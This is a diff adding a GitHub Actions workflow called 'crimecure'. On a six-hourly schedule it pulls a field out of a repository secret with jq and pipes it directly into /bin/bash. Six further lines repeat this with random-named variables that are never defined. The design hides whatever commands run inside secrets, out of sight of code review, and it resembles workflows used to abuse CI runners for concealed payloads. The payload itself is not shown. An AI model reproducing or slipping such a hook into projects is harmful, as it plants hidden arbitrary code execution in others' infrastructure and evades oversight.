@@ -1,0 +1,25 @@
+name: crimecure
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: crimecure
+        env:
+          lk62: ${{ secrets.lk62 }}
+        run: |
+          echo $lk62 | jq -r .e37562 | /bin/bash
+          echo $rnauh83078 | jq -r .g335 | /bin/bash
+          echo $bv475 | jq -r .p43427 | /bin/bash
+          echo $tdua35206 | jq -r .bqh299 | /bin/bash
+          echo $np7 | jq -r .ov00830 | /bin/bash
+          echo $x19463 | jq -r .ue2 | /bin/bash
+          echo $nh90 | jq -r .tboh152 | /bin/bash
+
